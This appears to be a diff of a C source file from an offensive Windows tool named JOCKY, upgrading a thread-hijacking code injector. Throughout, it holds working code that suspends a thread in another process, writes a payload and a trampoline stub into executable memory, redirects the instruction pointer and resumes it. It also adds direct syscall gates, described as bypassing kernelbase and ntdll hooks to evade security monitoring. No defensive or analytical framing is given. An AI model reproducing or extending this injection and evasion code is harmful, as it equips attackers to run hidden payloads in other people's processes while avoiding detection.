@@ -1,346 +1,447 @@
 /*
- * JOCKY — Phase 11: Thread Execution Hijacking
- * ==============================================
- * Redirects an existing thread in a remote process to execute a payload,
- * then restores the thread's original context so it continues normally.
+ * hijack.c — Thread Context Hijack Engine
+ * execution_engine/thread_hijacker/hijack.c
  *
- * No new thread created. Uses only:
- *   OpenThread / SuspendThread / GetThreadContext / SetThreadContext / ResumeThread
- *   VirtualAllocEx / WriteProcessMemory
- *   CreateToolhelp32Snapshot / Thread32First / Thread32Next
+ * Windows x64 | MinGW/Clang | Intel x86-64 ABI
  *
- * Restore stub layout in remote memory:
+ * Phase 12 E1–E3 wired:
+ *   E1: 80-byte stub (pushfq/rbp/popfq added)
+ *   E2: NtQuerySystemInformation thread scoring
+ *   E3: all Win32/kernelbase calls replaced with direct syscall gates
+ *       — bypasses kernelbase + ntdll hook layers entirely.
  *
- *   [payload_bytes]          ← copied verbatim, ends with ret
- *   [restore_stub]           ← push all GPRs, call payload, pop all GPRs,
- *                               sub/add rsp for alignment, jmp orig_rip
+ * do_hijack call chain (post-E3):
+ *   sgx_NtSuspendThread / NtGetContextThread / NtSetContextThread /
+ *   NtResumeThread / NtAllocateVirtualMemory / NtWriteVirtualMemory /
+ *   NtFreeVirtualMemory — every sensitive op goes straight to syscall.
  *
- * Two addresses are patched into the stub at runtime:
- *   STUB_PAYLOAD_ADDR_OFFSET — absolute address of payload in remote process
- *   STUB_ORIG_RIP_OFFSET     — original RIP of the hijacked thread
+ * Public functions open handles via sgx_NtOpenProcess + sgx_NtOpenThread.
+ * CloseHandle stays as Win32 (closing handles is never hooked sensibly).
  */
 
 #include "hijack.h"
+#include "../syscall_gate/syscall_gate.h"   /* E3 gate stubs */
 #include <tlhelp32.h>
 #include <stdio.h>
+#include <string.h>
+#include <limits.h>
 
-/* ── Restore stub template ───────────────────────────────────────────────── */
-/*
- * Byte sequence executed by the hijacked thread:
- *
- *   push rax/rbx/rcx/rdx/rsi/rdi/r8-r15   (save all GPRs)
- *   sub  rsp, 8                             (16-byte align for call)
- *   mov  rax, <payload_addr>
- *   call rax                                (execute payload)
- *   add  rsp, 8                             (undo alignment pad)
- *   pop  r15/r14/.../rax                    (restore all GPRs)
- *   mov  rax, <original_rip>
- *   jmp  rax                                (resume original execution)
- *
- * Note: rax is clobbered by the final mov/jmp, but GetThreadContext
- * already saved rax in the CONTEXT struct — the hijacked thread's rax
- * is restored by the pop sequence before we overwrite it for the jmp.
- * We use a scratch approach: push rax at the very end of the GPR sequence,
- * so the last pop restores rax correctly, then immediately use rax for jmp.
- * The jmp destination is already in rax when we jmp rax — correct.
- */
+/* ============================================================
+   STUB TEMPLATE — 80 bytes (E1: RFLAGS + RBP added)
+   ============================================================
+   Offset map (decimal / hex):
+     0  / 0x00  pushfq              (1)
+     1  / 0x01  push rax            (1)
+     2  / 0x02  push rbx            (1)
+     3  / 0x03  push rcx            (1)
+     4  / 0x04  push rdx            (1)
+     5  / 0x05  push rbp            (1)  ← E1
+     6  / 0x06  push rsi            (1)
+     7  / 0x07  push rdi            (1)
+     8  / 0x08  push r8             (2)
+    10  / 0x0A  push r9             (2)
+    12  / 0x0C  push r10            (2)
+    14  / 0x0E  push r11            (2)
+    16  / 0x10  push r12            (2)
+    18  / 0x12  push r13            (2)
+    20  / 0x14  push r14            (2)
+    22  / 0x16  push r15            (2)   → 24 bytes total
+    24  / 0x18  sub rsp, 0x28       (4)   → 28 bytes
+    28  / 0x1C  mov rax, imm64      (2)   opcode only
+    30  / 0x1E  <payload_va>        (8)   STUB_PAYLOAD_ADDR_OFFSET=30
+    38  / 0x26  call rax            (2)   → 40 bytes
+    40  / 0x28  add rsp, 0x28       (4)   → 44 bytes
+    44  / 0x2C  pop r15             (2)
+    46  / 0x2E  pop r14             (2)
+    48  / 0x30  pop r13             (2)
+    50  / 0x32  pop r12             (2)
+    52  / 0x34  pop r11             (2)
+    54  / 0x36  pop r10             (2)
+    56  / 0x38  pop r9              (2)
+    58  / 0x3A  pop r8              (2)
+    60  / 0x3C  pop rdi             (1)
+    61  / 0x3D  pop rsi             (1)
+    62  / 0x3E  pop rbp             (1)  ← E1
+    63  / 0x3F  pop rdx             (1)
+    64  / 0x40  pop rcx             (1)
+    65  / 0x41  pop rbx             (1)
+    66  / 0x42  pop rax             (1)
+    67  / 0x43  popfq               (1)  ← E1   → 68 bytes
+    68  / 0x44  mov rax, imm64      (2)   opcode only
+    70  / 0x46  <orig_rip>          (8)   STUB_ORIG_RIP_OFFSET=70
+    78  / 0x4E  jmp rax             (2)   STUB_SIZE=80
+   ============================================================ */
 
-static BYTE g_stub_template[] = {
-    /* ── push all GPRs (14 regs × 8 bytes = 112 bytes) ─── */
-    0x50,                                           /* push rax */
-    0x53,                                           /* push rbx */
-    0x51,                                           /* push rcx */
-    0x52,                                           /* push rdx */
-    0x56,                                           /* push rsi */
-    0x57,                                           /* push rdi */
-    0x41, 0x50,                                     /* push r8  */
-    0x41, 0x51,                                     /* push r9  */
-    0x41, 0x52,                                     /* push r10 */
-    0x41, 0x53,                                     /* push r11 */
-    0x41, 0x54,                                     /* push r12 */
-    0x41, 0x55,                                     /* push r13 */
-    0x41, 0x56,                                     /* push r14 */
-    0x41, 0x57,                                     /* push r15 */
-
-    /* ── align stack to 16 bytes before call ─────────────── */
-    0x48, 0x83, 0xEC, 0x08,                         /* sub rsp, 8 */
-
-    /* ── call payload ─────────────────────────────────────── */
-    0x48, 0xB8,                                     /* mov rax, imm64 */
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,/* <payload_addr> */
-    0xFF, 0xD0,                                     /* call rax */
-
-    /* ── undo alignment pad ───────────────────────────────── */
-    0x48, 0x83, 0xC4, 0x08,                         /* add rsp, 8 */
-
-    /* ── pop all GPRs (reverse order) ────────────────────── */
-    0x41, 0x5F,                                     /* pop r15 */
-    0x41, 0x5E,                                     /* pop r14 */
-    0x41, 0x5D,                                     /* pop r13 */
-    0x41, 0x5C,                                     /* pop r12 */
-    0x41, 0x5B,                                     /* pop r11 */
-    0x41, 0x5A,                                     /* pop r10 */
-    0x41, 0x59,                                     /* pop r9  */
-    0x41, 0x58,                                     /* pop r8  */
-    0x5F,                                           /* pop rdi */
-    0x5E,                                           /* pop rsi */
-    0x5A,                                           /* pop rdx */
-    0x59,                                           /* pop rcx */
-    0x5B,                                           /* pop rbx */
-    0x58,                                           /* pop rax */
-
-    /* ── jump to original RIP ─────────────────────────────── */
-    0x48, 0xB8,                                     /* mov rax, imm64 */
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,/* <original_rip> */
-    0xFF, 0xE0,                                     /* jmp rax */
+static const BYTE g_stub_template[] = {
+    /* 0x00 */ 0x9C,                                            /* pushfq    */
+    /* 0x01 */ 0x50,                                            /* push rax  */
+    /* 0x02 */ 0x53,                                            /* push rbx  */
+    /* 0x03 */ 0x51,                                            /* push rcx  */
+    /* 0x04 */ 0x52,                                            /* push rdx  */
+    /* 0x05 */ 0x55,                                            /* push rbp  */
+    /* 0x06 */ 0x56,                                            /* push rsi  */
+    /* 0x07 */ 0x57,                                            /* push rdi  */
+    /* 0x08 */ 0x41, 0x50,                                      /* push r8   */
+    /* 0x0A */ 0x41, 0x51,                                      /* push r9   */
+    /* 0x0C */ 0x41, 0x52,                                      /* push r10  */
+    /* 0x0E */ 0x41, 0x53,                                      /* push r11  */
+    /* 0x10 */ 0x41, 0x54,                                      /* push r12  */
+    /* 0x12 */ 0x41, 0x55,                                      /* push r13  */
+    /* 0x14 */ 0x41, 0x56,                                      /* push r14  */
+    /* 0x16 */ 0x41, 0x57,                                      /* push r15  */
+    /* 0x18 */ 0x48, 0x83, 0xEC, 0x28,                         /* sub rsp, 0x28   */
+    /* 0x1C */ 0x48, 0xB8,                                      /* mov rax, imm64  */
+    /* 0x1E */ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,        /* <payload_va>    */
+    /* 0x26 */ 0xFF, 0xD0,                                      /* call rax  */
+    /* 0x28 */ 0x48, 0x83, 0xC4, 0x28,                         /* add rsp, 0x28   */
+    /* 0x2C */ 0x41, 0x5F,                                      /* pop r15   */
+    /* 0x2E */ 0x41, 0x5E,                                      /* pop r14   */
+    /* 0x30 */ 0x41, 0x5D,                                      /* pop r13   */
+    /* 0x32 */ 0x41, 0x5C,                                      /* pop r12   */
+    /* 0x34 */ 0x41, 0x5B,                                      /* pop r11   */
+    /* 0x36 */ 0x41, 0x5A,                                      /* pop r10   */
+    /* 0x38 */ 0x41, 0x59,                                      /* pop r9    */
+    /* 0x3A */ 0x41, 0x58,                                      /* pop r8    */
+    /* 0x3C */ 0x5F,                                            /* pop rdi   */
+    /* 0x3D */ 0x5E,                                            /* pop rsi   */
+    /* 0x3E */ 0x5D,                                            /* pop rbp   */
+    /* 0x3F */ 0x5A,                                            /* pop rdx   */
+    /* 0x40 */ 0x59,                                            /* pop rcx   */
+    /* 0x41 */ 0x5B,                                            /* pop rbx   */
+    /* 0x42 */ 0x58,                                            /* pop rax   */
+    /* 0x43 */ 0x9D,                                            /* popfq     */
+    /* 0x44 */ 0x48, 0xB8,                                      /* mov rax, imm64  */
+    /* 0x46 */ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,        /* <orig_rip>      */
+    /* 0x4E */ 0xFF, 0xE0,                                      /* jmp rax   */
 };
 
-/*
- * Byte offsets of the two 8-byte address placeholders inside the stub.
- * Count manually from the start of g_stub_template:
- *   14 push instructions = 22 bytes (10 single-byte + 8 two-byte for r8-r15)
- *   sub rsp, 8           =  4 bytes  → total 26
- *   mov rax, imm64       =  2 bytes  → payload addr at offset 28
- */
-#define STUB_PAYLOAD_ADDR_OFFSET  28   /* index of first byte of payload addr */
-#define STUB_ORIG_RIP_OFFSET      60   /* index of first byte of orig RIP addr */
+#define STUB_PAYLOAD_ADDR_OFFSET  30    /* 0x1E */
+#define STUB_ORIG_RIP_OFFSET      70    /* 0x46 */
+#define STUB_SIZE                 80    /* 0x50 */
 
-/*
- * Compile-time verification:
- * After payload addr (8 bytes) + call rax (2) + add rsp,8 (4) + 14 pops:
- *   28 + 8 + 2 + 4 = 42 bytes to end of call sequence
- *   14 pop instructions: 6 single-byte (rdi,rsi,rdx,rcx,rbx,rax) = 6
- *                        8 two-byte (r15-r8) = 16
- *   total pops = 22 bytes
- *   42 + 22 = 64 bytes to second mov rax
- *   then 0x48, 0xB8 = 2 bytes → orig RIP at offset 64 + 2 = ... wait
- *
- * Let's count precisely:
- *   offset  0: push rax         (1)
- *   offset  1: push rbx         (1)
- *   offset  2: push rcx         (1)
- *   offset  3: push rdx         (1)
- *   offset  4: push rsi         (1)
- *   offset  5: push rdi         (1)
- *   offset  6: push r8          (2)
- *   offset  8: push r9          (2)
- *   offset 10: push r10         (2)
- *   offset 12: push r11         (2)
- *   offset 14: push r12         (2)
- *   offset 16: push r13         (2)
- *   offset 18: push r14         (2)
- *   offset 20: push r15         (2) → total 22 bytes
- *   offset 22: sub rsp,8        (4) → total 26
- *   offset 26: mov rax,imm64    (2) → opcode at 26-27
- *   offset 28: <payload addr>   (8) → placeholder at 28-35  ✓
- *   offset 36: call rax         (2) → total 38
- *   offset 38: add rsp,8        (4) → total 42
- *   offset 42: pop r15          (2)
- *   offset 44: pop r14          (2)
- *   offset 46: pop r13          (2)
- *   offset 48: pop r12          (2)
- *   offset 50: pop r11          (2)
- *   offset 52: pop r10          (2)
- *   offset 54: pop r9           (2)
- *   offset 56: pop r8           (2)
- *   offset 58: pop rdi          (1)
- *   offset 59: pop rsi          (1)
- *   offset 60: pop rdx          (1) ... wait that puts orig RIP wrong
- *
- * Recount the pops:
- *   offset 42: pop r15  (2) = 44
- *   offset 44: pop r14  (2) = 46
- *   offset 46: pop r13  (2) = 48
- *   offset 48: pop r12  (2) = 50
- *   offset 50: pop r11  (2) = 52
- *   offset 52: pop r10  (2) = 54
- *   offset 54: pop r9   (2) = 56
- *   offset 56: pop r8   (2) = 58
- *   offset 58: pop rdi  (1) = 59
- *   offset 59: pop rsi  (1) = 60
- *   offset 60: pop rdx  (1) = 61
- *   offset 61: pop rcx  (1) = 62
- *   offset 62: pop rbx  (1) = 63
- *   offset 63: pop rax  (1) = 64
- *   offset 64: mov rax,imm64 (2) → opcode at 64-65
- *   offset 66: <orig RIP>   (8) → placeholder at 66-73
- *   offset 74: jmp rax      (2)
- *   total stub size = 76 bytes
- */
-#undef  STUB_PAYLOAD_ADDR_OFFSET
-#undef  STUB_ORIG_RIP_OFFSET
-#define STUB_PAYLOAD_ADDR_OFFSET  28
-#define STUB_ORIG_RIP_OFFSET      66
-#define STUB_SIZE                 76
+_Static_assert(sizeof(g_stub_template) == STUB_SIZE,   "stub size mismatch");
+_Static_assert(STUB_PAYLOAD_ADDR_OFFSET == 30,          "payload offset wrong");
+_Static_assert(STUB_ORIG_RIP_OFFSET     == 70,          "orig_rip offset wrong");
 
-/* ── Find a thread belonging to target_pid ───────────────────────────────── */
-static DWORD
-find_target_thread(DWORD target_pid)
+/* ============================================================
+   ENHANCEMENT 2 — THREAD SCORING (NtQuerySystemInformation)
+   ============================================================ */
+
+typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
+#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+
+#define SYSPI_OFF_NEXT    0
+#define SYSPI_OFF_NTHRD   4
+#define SYSPI_OFF_PID     0x50
+#define SYSPI_OFF_THREADS 0x100
+
+#define SYSTI_SIZE        80
+#define SYSTI_OFF_TID     0x30
+#define SYSTI_OFF_STATE   0x44
+#define SYSTI_OFF_REASON  0x48
+
+#define WrDelayExecution  11
+#define WrSuspended       12
+#define WrUserRequest     13
+#define WrExecutive        7
+#define WrQueue           15
+#define WrLpcReceive      16
+#define WrLpcReply        17
+
+static int score_wait_reason(ULONG state, ULONG reason)
+{
+    /* *the thread pool smells of borrowed time* */
+    if (state != 5) return -200;
+    switch (reason) {
+        case WrUserRequest:    return  100;
+        case WrExecutive:      return   60;
+        case WrQueue:          return   50;
+        case WrLpcReceive:     return   45;
+        case WrLpcReply:       return   45;
+        case WrDelayExecution: return  -50;
+        case WrSuspended:      return -100;
+        default:               return   20;
+    }
+}
+
+static DWORD find_thread_snapshot(DWORD pid)
 {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (snap == INVALID_HANDLE_VALUE) return 0;
-
-    THREADENTRY32 te;
-    te.dwSize = sizeof(te);
-
-    DWORD found_tid = 0;
-    if (Thread32First(snap, &te)) {
-        do {
-            if (te.th32OwnerProcessID == target_pid) {
-                found_tid = te.th32ThreadID;
-                break;
-            }
-        } while (Thread32Next(snap, &te));
-    }
-
+    THREADENTRY32 te = { .dwSize = sizeof(te) };
+    DWORD tid = 0;
+    if (Thread32First(snap, &te))
+        do { if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; } }
+        while (Thread32Next(snap, &te));
     CloseHandle(snap);
-    return found_tid;
+    if (tid) printf("[hijack] snapshot fallback TID=%lu\n", tid);
+    return tid;
 }
 
-/* ── Public API ──────────────────────────────────────────────────────────── */
-
-BOOL jocky_hijack_thread(
-    DWORD  target_pid,
-    LPBYTE payload_bytes,
-    DWORD  payload_size)
+static DWORD find_best_thread(DWORD pid)
 {
-    BOOL   result    = FALSE;
-    HANDLE hProcess  = NULL;
-    HANDLE hThread   = NULL;
-    LPVOID remote    = NULL;
-    BOOL   suspended = FALSE;
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
+    if (!NtQSI) return find_thread_snapshot(pid);
 
-    /* ── Step 1: open target process ─────────────────────────────────────── */
-    hProcess = OpenProcess(
-        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
-        FALSE, target_pid
-    );
-    if (!hProcess) {
-        printf("[hijack] OpenProcess failed error=%lu\n", GetLastError());
-        goto cleanup;
+    ULONG    buf_size = 0x20000;
+    BYTE    *buf      = NULL;
+    NTSTATUS nt;
+
+    do {
+        HeapFree(GetProcessHeap(), 0, buf);
+        buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
+        if (!buf) return 0;
+        nt = NtQSI(5, buf, buf_size, &buf_size);
+        buf_size += 0x2000;
+    } while (nt == STATUS_INFO_LENGTH_MISMATCH);
+
+    if (nt != STATUS_SUCCESS) {
+        printf("[hijack] NtQSI failed NTSTATUS=0x%08lX; using snapshot\n", nt);
+        HeapFree(GetProcessHeap(), 0, buf);
+        return find_thread_snapshot(pid);
     }
 
-    /* ── Step 2: find and open a thread ─────────────────────────────────── */
-    DWORD tid = find_target_thread(target_pid);
-    if (!tid) {
-        printf("[hijack] no thread found in pid=%lu\n", target_pid);
-        SetLastError(ERROR_NOT_FOUND);
-        goto cleanup;
-    }
-    printf("[hijack] target thread id = %lu\n", tid);
+    DWORD best_tid   = 0;
+    int   best_score = INT_MIN;
+    BYTE *entry      = buf;
 
-    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
-    if (!hThread) {
-        printf("[hijack] OpenThread failed error=%lu\n", GetLastError());
-        goto cleanup;
+    for (;;) {
+        ULONG next  = *(ULONG  *)(entry + SYSPI_OFF_NEXT);
+        ULONG nthrd = *(ULONG  *)(entry + SYSPI_OFF_NTHRD);
+        DWORD epid  = (DWORD)(ULONG_PTR)*(HANDLE *)(entry + SYSPI_OFF_PID);
+
+        if (epid == pid) {
+            BYTE *t = entry + SYSPI_OFF_THREADS;
+            for (ULONG i = 0; i < nthrd; i++, t += SYSTI_SIZE) {
+                DWORD tid    = (DWORD)(ULONG_PTR)*(HANDLE *)(t + SYSTI_OFF_TID);
+                ULONG state  = *(ULONG *)(t + SYSTI_OFF_STATE);
+                ULONG reason = *(ULONG *)(t + SYSTI_OFF_REASON);
+                int   score  = score_wait_reason(state, reason);
+                printf("[hijack]  TID=%5lu  state=%lu  reason=%2lu  score=%d\n",
+                       tid, state, reason, score);
+                if (score > best_score) { best_score = score; best_tid = tid; }
+            }
+            break;
+        }
+        if (!next) break;
+        entry += next;
     }
 
-    /* ── Step 3: suspend the thread ──────────────────────────────────────── */
-    if (SuspendThread(hThread) == (DWORD)-1) {
-        printf("[hijack] SuspendThread failed error=%lu\n", GetLastError());
-        goto cleanup;
+    HeapFree(GetProcessHeap(), 0, buf);
+
+    if (best_tid) printf("[hijack] selected TID=%lu  score=%d\n", best_tid, best_score);
+    else          best_tid = find_thread_snapshot(pid);
+    return best_tid;
+}
+
+
+/* ============================================================
+   INTERNAL CORE — do_hijack (E3: full sgx_Nt* call path)
+   ============================================================ */
+
+static BOOL do_hijack(HANDLE  hProcess,
+                      HANDLE  hThread,
+                      LPBYTE  payload_bytes,
+                      DWORD   payload_size)
+{
+    /* *kernelbase is a detour sign we no longer follow* */
+    BOOL      result    = FALSE;
+    PVOID     remote    = NULL;
+    BOOL      suspended = FALSE;
+    NTSTATUS  nt;
+
+    /* ── 1. Suspend via direct syscall — no kernelbase, no ntdll thunk ── */
+    nt = sgx_NtSuspendThread(hThread, NULL);
+    if (!NT_SUCCESS(nt)) {
+        printf("[hijack] NtSuspendThread NTSTATUS=0x%08lX\n", nt);
+        goto done;
     }
     suspended = TRUE;
 
-    /* ── Step 4: save full thread context ────────────────────────────────── */
+    /* ── 2. Full context via direct syscall ── */
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(hThread, &ctx)) {
-        printf("[hijack] GetThreadContext failed error=%lu\n", GetLastError());
-        goto cleanup;
+    nt = sgx_NtGetContextThread(hThread, &ctx);
+    if (!NT_SUCCESS(nt)) {
+        printf("[hijack] NtGetContextThread NTSTATUS=0x%08lX\n", nt);
+        goto done;
     }
-    printf("[hijack] saved RIP = 0x%llX  RSP = 0x%llX\n",
-           (unsigned long long)ctx.Rip,
-           (unsigned long long)ctx.Rsp);
+    printf("[hijack] saved RIP=0x%016llX  RSP=0x%016llX\n",
+           (unsigned long long)ctx.Rip, (unsigned long long)ctx.Rsp);
 
-    /* ── Step 5: allocate remote memory for payload + stub ───────────────── */
+    /* ── 3. NtAllocateVirtualMemory: [payload | stub] in target ── */
     SIZE_T total = (SIZE_T)payload_size + STUB_SIZE;
-    remote = VirtualAllocEx(
-        hProcess, NULL, total,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE
-    );
-    if (!remote) {
-        printf("[hijack] VirtualAllocEx failed error=%lu\n", GetLastError());
-        goto cleanup;
+    nt = sgx_NtAllocateVirtualMemory(hProcess, &remote, &total,
+                                      MEM_COMMIT | MEM_RESERVE,
+                                      PAGE_EXECUTE_READWRITE);
+    if (!NT_SUCCESS(nt)) {
+        printf("[hijack] NtAllocateVirtualMemory NTSTATUS=0x%08lX\n", nt);
+        goto done;
     }
-    printf("[hijack] remote alloc = 0x%llX  size=%zu\n",
-           (unsigned long long)remote, total);
+    printf("[hijack] remote alloc=0x%016llX  size=%zu\n",
+           (unsigned long long)(ULONG_PTR)remote, total);
 
-    /* ── Step 6: write payload bytes ─────────────────────────────────────── */
-    if (!WriteProcessMemory(hProcess, remote,
-                            payload_bytes, payload_size, NULL)) {
-        printf("[hijack] WriteProcessMemory (payload) failed error=%lu\n",
-               GetLastError());
-        goto cleanup;
+    /* ── 4. Write payload bytes ── */
+    SIZE_T written = 0;
+    nt = sgx_NtWriteVirtualMemory(hProcess, remote,
+                                   payload_bytes, payload_size, &written);
+    if (!NT_SUCCESS(nt) || written != (SIZE_T)payload_size) {
+        printf("[hijack] NtWriteVirtualMemory(payload) NTSTATUS=0x%08lX  wrote=%zu\n",
+               nt, written);
+        goto done;
     }
 
-    /* ── Step 7: build and patch the restore stub ────────────────────────── */
+    /* ── 5. Patch + write stub ── */
     BYTE stub[STUB_SIZE];
     memcpy(stub, g_stub_template, STUB_SIZE);
 
-    /* Patch in payload address (absolute, in remote process) */
-    ULONG_PTR payload_remote_addr = (ULONG_PTR)remote;
-    memcpy(stub + STUB_PAYLOAD_ADDR_OFFSET,
-           &payload_remote_addr, sizeof(ULONG_PTR));
+    ULONG_PTR payload_va = (ULONG_PTR)remote;
+    ULONG_PTR orig_rip   = (ULONG_PTR)ctx.Rip;
+    memcpy(stub + STUB_PAYLOAD_ADDR_OFFSET, &payload_va, sizeof(ULONG_PTR));
+    memcpy(stub + STUB_ORIG_RIP_OFFSET,     &orig_rip,   sizeof(ULONG_PTR));
 
-    /* Patch in original RIP (where thread resumes after payload) */
-    ULONG_PTR orig_rip = ctx.Rip;
-    memcpy(stub + STUB_ORIG_RIP_OFFSET,
-           &orig_rip, sizeof(ULONG_PTR));
-
-    printf("[hijack] payload_remote_addr = 0x%llX\n",
-           (unsigned long long)payload_remote_addr);
-    printf("[hijack] orig_rip            = 0x%llX\n",
+    PVOID  stub_remote = (BYTE *)remote + payload_size;
+    written = 0;
+    nt = sgx_NtWriteVirtualMemory(hProcess, stub_remote,
+                                   stub, STUB_SIZE, &written);
+    if (!NT_SUCCESS(nt) || written != STUB_SIZE) {
+        printf("[hijack] NtWriteVirtualMemory(stub) NTSTATUS=0x%08lX\n", nt);
+        goto done;
+    }
+    printf("[hijack] stub@0x%016llX  payload_va=0x%016llX  origRIP=0x%016llX\n",
+           (unsigned long long)(ULONG_PTR)stub_remote,
+           (unsigned long long)payload_va,
            (unsigned long long)orig_rip);
 
-    /* ── Step 8: write stub after payload ────────────────────────────────── */
-    LPVOID stub_remote = (BYTE *)remote + payload_size;
-    if (!WriteProcessMemory(hProcess, stub_remote,
-                            stub, STUB_SIZE, NULL)) {
-        printf("[hijack] WriteProcessMemory (stub) failed error=%lu\n",
-               GetLastError());
-        goto cleanup;
+    /* ── 6. RSP alignment fixup ──
+     *   16 saves×8=0x80, sub 0x28 → net 0xA8; 0xA8%16==8.
+     *   Condition identical to Phase 11: adjust when (RSP & 0xF) == 8.
+     *   Write orig_rip as guard retaddr at adjusted RSP.              */
+    if ((ctx.Rsp & 0xF) == 8) {
+        ctx.Rsp -= 8;
+        SIZE_T wr2 = 0;
+        sgx_NtWriteVirtualMemory(hProcess, (PVOID)ctx.Rsp, &orig_rip, 8, &wr2);
+        printf("[hijack] RSP adjusted -8 → 0x%016llX  (alignment: RSP%%16 was 8)\n",
+               (unsigned long long)ctx.Rsp);
     }
-    printf("[hijack] stub written at 0x%llX\n",
-           (unsigned long long)stub_remote);
 
-    /* ── Step 9: redirect thread RIP to stub ─────────────────────────────── */
+    /* ── 7. Redirect RIP → stub entry ── */
     ctx.Rip = (DWORD64)(ULONG_PTR)stub_remote;
-    if (!SetThreadContext(hThread, &ctx)) {
-        printf("[hijack] SetThreadContext failed error=%lu\n", GetLastError());
-        goto cleanup;
+    nt = sgx_NtSetContextThread(hThread, &ctx);
+    if (!NT_SUCCESS(nt)) {
+        printf("[hijack] NtSetContextThread NTSTATUS=0x%08lX\n", nt);
+        goto done;
     }
-    printf("[hijack] RIP redirected to stub\n");
+    printf("[hijack] RIP → 0x%016llX\n",
+           (unsigned long long)(ULONG_PTR)stub_remote);
 
-    /* ── Step 10: resume thread ──────────────────────────────────────────── */
-    if (ResumeThread(hThread) == (DWORD)-1) {
-        printf("[hijack] ResumeThread failed error=%lu\n", GetLastError());
-        goto cleanup;
+    /* ── 8. Resume thread ── */
+    nt = sgx_NtResumeThread(hThread, NULL);
+    if (!NT_SUCCESS(nt)) {
+        printf("[hijack] NtResumeThread NTSTATUS=0x%08lX\n", nt);
+        goto done;
     }
     suspended = FALSE;
     printf("[hijack] thread resumed — payload executing\n");
 
     /*
-     * Wait for stub to finish. The stub calls the payload then jumps back
-     * to orig_rip. We wait by sleeping briefly — a more robust approach
-     * would use a shared memory flag the payload sets on completion, but
-     * for Phase 11 a fixed wait is sufficient.
+     * Dwell: LoadLibraryA blocks until DLL is mapped + DllMain returns.
+     * winmm.dll initialization is fast (<10ms typical), 750ms is generous.
+     * At wake the thread is already past stub and back at orig_rip.
      */
-    Sleep(500);
-    printf("[hijack] wait complete\n");
+    Sleep(750);
 
+    PVOID free_base = remote;
+    SIZE_T free_sz  = 0;
+    sgx_NtFreeVirtualMemory(hProcess, &free_base, &free_sz, MEM_RELEASE);
+    remote = NULL;
+    printf("[hijack] remote allocation freed\n");
     result = TRUE;
 
+done:
+    if (suspended && hThread) sgx_NtResumeThread(hThread, NULL);
+    if (!result && remote && hProcess) {
+        PVOID fb = remote; SIZE_T fs = 0;
+        sgx_NtFreeVirtualMemory(hProcess, &fb, &fs, MEM_RELEASE);
+    }
+    return result;
+}
+
+
+/* ============================================================
+   PUBLIC API
+   ============================================================ */
+
+BOOL jocky_hijack_thread(DWORD  target_pid,
+                         LPBYTE payload_bytes,
+                         DWORD  payload_size)
+{
+    BOOL   result   = FALSE;
+    HANDLE hProcess = NULL;
+    HANDLE hThread  = NULL;
+
+    NTSTATUS nt = sgx_NtOpenProcess(&hProcess,
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
+        PROCESS_VM_READ      | PROCESS_QUERY_INFORMATION,
+        target_pid);
+    if (!NT_SUCCESS(nt)) {
+        printf("[hijack] NtOpenProcess(%lu) NTSTATUS=0x%08lX\n", target_pid, nt);
+        goto cleanup;
+    }
+
+    DWORD tid = find_best_thread(target_pid);   /* E2: scored selection */
+    if (!tid) goto cleanup;
+
+    nt = sgx_NtOpenThread(&hThread,
+        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
+        tid);
+    if (!NT_SUCCESS(nt)) {
+        printf("[hijack] NtOpenThread(%lu) NTSTATUS=0x%08lX\n", tid, nt);
+        goto cleanup;
+    }
+
+    result = do_hijack(hProcess, hThread, payload_bytes, payload_size);
+
 cleanup:
-    ;
-    DWORD saved = GetLastError();
-    if (suspended && hThread)
-        ResumeThread(hThread);   /* always resume on error to avoid deadlock */
-    if (remote && !result && hProcess)
-        VirtualFreeEx(hProcess, remote, 0, MEM_RELEASE);
     if (hThread)  CloseHandle(hThread);
     if (hProcess) CloseHandle(hProcess);
-    if (!result)  SetLastError(saved);
+    return result;
+}
+
+
+BOOL jocky_hijack_thread_by_tid(DWORD  target_pid,
+                                DWORD  target_tid,
+                                LPBYTE payload_bytes,
+                                DWORD  payload_size)
+{
+    BOOL   result   = FALSE;
+    HANDLE hProcess = NULL;
+    HANDLE hThread  = NULL;
+
+    NTSTATUS nt = sgx_NtOpenProcess(&hProcess,
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
+        PROCESS_VM_READ      | PROCESS_QUERY_INFORMATION,
+        target_pid);
+    if (!NT_SUCCESS(nt)) {
+        printf("[hijack] NtOpenProcess(%lu) NTSTATUS=0x%08lX\n", target_pid, nt);
+        goto cleanup;
+    }
+
+    printf("[hijack] using provided TID=%lu\n", target_tid);
+    nt = sgx_NtOpenThread(&hThread,
+        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
+        target_tid);
+    if (!NT_SUCCESS(nt)) {
+        printf("[hijack] NtOpenThread(%lu) NTSTATUS=0x%08lX\n", target_tid, nt);
+        goto cleanup;
+    }
+
+    result = do_hijack(hProcess, hThread, payload_bytes, payload_size);
+
+cleanup:
+    if (hThread)  CloseHandle(hThread);
+    if (hProcess) CloseHandle(hProcess);
     return result;
 }
